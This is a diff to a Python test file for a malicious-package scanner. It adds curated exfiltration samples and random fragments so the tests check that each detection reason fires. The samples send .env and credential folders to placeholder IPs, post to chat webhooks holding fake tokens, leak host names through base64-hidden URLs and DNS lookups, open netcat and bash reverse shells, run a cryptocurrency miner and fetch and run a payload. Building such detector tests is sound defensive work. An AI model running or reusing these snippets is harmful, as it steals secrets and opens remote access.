@@ -306,6 +306,69 @@ SIGN_CURATED = [
     "import urllib.request, subprocess\nurllib.request.urlretrieve('http://files.invalid/t', 'tool.py')\n"
     "subprocess.run(['python', 'tool.py'])\n",
 ]
+# exfiltration (0.1.8): a chat bot or webhook whose secret is in the code,
+# credential files sent to a raw IP address, a sweep of credential folders,
+# the host name sent to a base64-hidden address or in a DNS name, the public
+# IP address sent to a capture service, a copy of the environment
+# serialized, a reverse shell as an argument list or to an ngrok TCP address,
+# a miner, a raw socket to a hard-coded address, browser shortcuts rewritten.
+# The secrets are built here (fake, and not written out whole in the source).
+_TG = "1234567" + "89:AA" + "bC3dE5fG7hJ9kL1mN3pQ5rS7tV9wX1yZ3"
+_DISCORD = "discord.com/api/webhooks/" + "123456789012345678/" + "aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789-_aBcDeFgHiJkLmNoPqRsTuVwXyZ01"
+_SLACK = "hooks.slack.com/services/" + "TABCDEF12/" + "BABCDEF12/" + "aBcDeFgHiJkLmNoPqRsTuVwX"
+_XMR = "4" + ("AbCdEfGhJk" * 10)[:94]
+EXFIL = ["\n", "\n", " ", "'", '"', "`", "(", ")", "[", "]", ",", ";", "=", "{", "}", "/", ".", "\\",
+         "requests.post(", "fetch(", "https.get(", "import requests\n", "urllib.request.urlopen(", "curl -s ",
+         _TG, "api.telegram.org/bot", "https://" + _DISCORD, "https://" + _SLACK, "T00000000", "X" * 24,
+         "'.env'", "'~/.npmrc'", "'.aws/credentials'", "'/.ssh/id_rsa'", "http://203.0.113.9:8855/",
+         "https://198.51.100.7/x", "http://10.0.0.1/", "'.ssh'", "'.aws'", "'.ethereum'", "'.kube'", "'.docker'",
+         "'$HOME/.gnupg'", "socket.gethostname()", "os.hostname", "'aHR0cHM6Ly9hLmludmFsaWQ='",
+         'socket.getaddrinfo(f"{h}.x.invalid.com", 80)', "dns.lookup(`${h}.x.invalid.com`)", "api.ipify.org",
+         "webhook.site/abc", "abcdef12.ngrok-free.app", "2.tcp.eu.ngrok.io", "'bash'", "'nc'", "spawn(", "'-e'",
+         "'/bin/sh'", "env = dict(os.environ)", "urlencode(env)", "const e = {...process.env}", "JSON.stringify(e)",
+         "'203.0.113.5'", "sock.connect((ip, 80))", "'8.8.8.8'", _XMR, "'-o'", "stratum+tcp://pool.invalid:3333",
+         "subprocess.Popen(", "CreateShortcut", "--load-extension=x", ".lnk", "\U0001F600", "\u00e9"]
+EXFIL_REASONS = ("sends data to a Telegram bot whose token is written in the code",
+                 "sends data to a Discord webhook whose token is written in the code",
+                 "sends data to a Slack webhook whose key is written in the code",
+                 "reads credential files and sends data to an IP address",
+                 "collects files from several credential folders and sends data over the network",
+                 "sends the machine's user or host name to an address it hides in base64",
+                 "sends the machine's user or host name in a DNS lookup of a name it builds",
+                 "sends the machine's public IP address to a data-capture service", "runs a cryptocurrency miner",
+                 "rewrites browser shortcuts to load an extension")
+EXFIL_CURATED = [
+    "import requests\nTOKEN = '" + _TG + "'\ndef go():\n    requests.post(f'https://api.telegram.org/bot{TOKEN}"
+    "/sendDocument', files={'document': open('w.zip', 'rb')})\n",
+    "const url = 'https://" + _SLACK + "';\nfetch(url, { method: 'POST', body: JSON.stringify({ text: 'hi' }) });\n",
+    "const url = 'https://" + _DISCORD + "';\nfetch(url, { method: 'POST' });\n",
+    "const url = 'https://hooks.slack.com/services/T00000000/B00000000/" + "X" * 24 + "';\nfetch(url);\n",
+    "const fs = require('fs');\nconst https = require('https');\nconst d = fs.readFileSync('.env', 'utf8');\n"
+    "https.get(`https://203.0.113.9:8855/1?data=${encodeURIComponent(d)}`);\n",
+    "import os, urllib.request\nDIRS = [os.path.join(H, d) for d in ['.ssh', '.aws', '.ethereum', '.docker', '.kube']]\n"
+    "urllib.request.urlopen(req)\n",
+    "import socket, base64, urllib.request\nh = socket.gethostname()\nu1 = 'aHR0cHM6Ly9h'\nu2 = 'LmludmFsaWQ='\n"
+    "url = base64.b64decode(f'{u1}{u2}').decode() + f'?h={h}'\nurllib.request.urlopen(url)\n",
+    "import socket\nh = socket.gethostname()\nsocket.getaddrinfo(f\"{h}.u.x.invalid.com\", 80)\n",
+    "import requests, platform\nip = requests.get('https://api.ipify.org').text\n"
+    "requests.post('https://webhook.site/0000', json={'ip': ip, 'os': platform.platform()})\n",
+    "import os, urllib.request, urllib.parse\ndef run():\n    data = dict(os.environ)\n"
+    "    body = urllib.parse.urlencode(data).encode()\n    urllib.request.urlopen(urllib.request.Request("
+    "'https://abcd1234.ngrok.app/c', data=body))\n",
+    "const { spawn } = require('child_process');\nspawn('bash', ['-i', 'nc', '2.tcp.eu.ngrok.io', '12151']);\n",
+    "const cp = require('child_process');\ncp.spawn('nc', ['203.0.113.2', '4444', '-e', '/bin/sh']);\n",
+    "const { exec } = require('child_process');\nexec(`curl -X POST \"https://7195e44e.ngrok-free.app/$(whoami)/$(hostname)\"`);\n",
+    "import socket\nfrom setuptools.command.install import install\nclass I(install):\n    def run(self):\n"
+    "        ip = '203.0.113.5'\n        s = socket.socket()\n        s.connect((ip, 12345))\n",
+    "import socket\ns = socket.create_connection(('8.8.8.8', 53))\n",
+    "import subprocess\ndef safe_run(path):\n    subprocess.Popen([path, '-u', '" + _XMR + "', '-o', "
+    "'pool.invalid:8080', '-k'])\n",
+    "shell = Dispatch('WScript.Shell')\ns = shell.CreateShortcut(p)\ns.Arguments = '--load-extension=X'\ns.Save()\n",
+    "const dns = require('dns');\nconst h = tryGet(os.hostname);\ndns.resolve(h + '.dns.x.invalid', cb);\n",
+    "import subprocess as _sub, sys as _sys\n_url = 'https://203.0.113.4/t.pyz'\n_dest = '/tmp/t.pyz'\n"
+    "_sub.run(['curl', '-k', '-L', '-s', _url, '-o', _dest], timeout=15)\n"
+    "_sub.Popen([_sys.executable, _dest], start_new_session=True)\n",
+]
 # prose (0.1.7): comments, docstrings and strings standing alone, which the
 # import-time test reads out of a Python or JavaScript file, around exec calls
 # that PowerShell must be an argument of, and the code that stays code
@@ -559,10 +622,11 @@ def corpus(seed=20260926, scale=1):
     JavaScript string cannot)."""
     rnd = random.Random(seed)
     cases = (list(CURATED) + SIGN_CURATED + PROSE_CURATED + SELF_CURATED + PERSIST_CURATED + PUBLISH_CURATED
-             + DECODED_CURATED + SPAWN_CURATED)
+             + DECODED_CURATED + SPAWN_CURATED + EXFIL_CURATED)
     for pieces, count, most in ((MIXED, 2500, 14), (QUOTING, 1500, 16), (CD, 1500, 16), (NODE_E, 1500, 16),
                                 (SCRIPT, 1000, 12), (RECEIVED, 1500, 16), (SIGNS, 2000, 10), (PROSE, 2500, 16),
-                                (SELF, 1500, 14), (PERSIST, 2500, 10), (PUBLISH, 3000, 12), (DECODED, 4000, 12), (SPAWN, 3000, 10)):
+                                (SELF, 1500, 14), (PERSIST, 2500, 10), (PUBLISH, 3000, 12), (DECODED, 4000, 12), (SPAWN, 3000, 10),
+                                (EXFIL, 2500, 10)):
         for _ in range(count * scale):
             cases.append("".join(rnd.choice(pieces) for _ in range(rnd.randint(1, most))))
     for _ in range(1500 * scale):                   # #! lines: an interpreter, then anything
@@ -687,7 +751,10 @@ class HookParityTests(unittest.TestCase):
         # and the 6 persistence reasons (0.1.7); and (0.1.8) the 3 reasons for publishing, npm tokens and a
         # DLL run, with the self-publishing and DLL counters; a script downloaded or decoded, written and run
         # with a shell or an interpreter, a decoded file run, the decoded view and a reason only it shows
-        self.assertEqual(len(counts), 45, counts)
+        # and (0.1.8, exfiltration) the Telegram, Discord and Slack secrets, credential files sent to an IP
+        # address, a credential sweep, the host name hidden in base64 or sent in a DNS name, the public IP
+        # address sent to a capture service, a miner and browser shortcuts rewritten
+        self.assertEqual(len(counts), 55, counts)
         # these reasons are rarer in the random stream but present (curated) and well above zero
         rare = {"not followed completely", "deserializes data it receives over the network",
                 "loads a module named by data it receives over the network", "downloads a file and then runs it",
@@ -697,7 +764,7 @@ class HookParityTests(unittest.TestCase):
                 "carries a GitHub Actions workflow that dumps every repository secret",
                 "downloads the Bun runtime from GitHub and runs code with it", "self-publishing",
                 "downloads a script and runs it with a shell or an interpreter", "writes a file it decodes and runs it",
-                "a reason in decoded strings"}
+                "a reason in decoded strings", *EXFIL_REASONS}
         self.assertEqual({k: n for k, n in counts.items() if n < 100 and k not in rare}, {}, counts)
         self.assertGreaterEqual(counts["not followed completely"], 7, counts)   # the curated limit cases
         self.assertGreaterEqual(counts["deserializes data it receives over the network"], 25, counts)
@@ -709,6 +776,8 @@ class HookParityTests(unittest.TestCase):
         self.assertGreaterEqual(counts["carries a GitHub Actions workflow that dumps every repository secret"], 30, counts)
         self.assertGreaterEqual(counts["downloads the Bun runtime from GitHub and runs code with it"], 30, counts)
         self.assertGreaterEqual(counts["self-publishing"], 30, counts)
+        for reason in EXFIL_REASONS:
+            self.assertGreaterEqual(counts[reason], 5, (reason, counts))
 
     def test_pattern_text_and_names_are_cores(self):
         """The JS module carries core's pattern text verbatim, with the same
@@ -737,9 +806,12 @@ class HookParityTests(unittest.TestCase):
                                                  "_LITERAL_SPANS_MAX", "_PERSIST_MAX_LINES", "_SELF_PUB_SPAN",
                                                  "_SELF_PUB_MAX", "_DV_MAX_LITERAL", "_DV_BODY", "_DV_MAX_HELPERS",
                                                  "_DV_MAX_ARRAYS", "_DV_MAX_CHARS", "_SPAWN_MAX_DEPTH",
-                                                 "_SPAWN_MAX_FILES", "_SPAWN_NAME_DEPTH", "_SPAWN_MAX_TARGETS")})
-        self.assertEqual(len(self.twins["patterns"]), 126)
-        self.assertEqual(len(self.twins["sets"]), 30)
+                                                 "_SPAWN_MAX_FILES", "_SPAWN_NAME_DEPTH", "_SPAWN_MAX_TARGETS",
+                                                 "_CHAT_SECRET_MAX", "_CHAT_SECRET_MIN_DISTINCT", "_CRED_SWEEP_SPAN",
+                                                 "_CRED_SWEEP_MIN", "_CRED_SWEEP_MAX", "_ENV_COPY_MAX",
+                                                 "_RAW_CONNECT_SPAN", "_IP_LITERAL_MAX", "_DNS_LOOKUP_MAX")})
+        self.assertEqual(len(self.twins["patterns"]), 146)
+        self.assertEqual(len(self.twins["sets"]), 35)
         self.assertEqual(len(self.twins["maps"]), 4)
 
 if __name__ == "__main__":
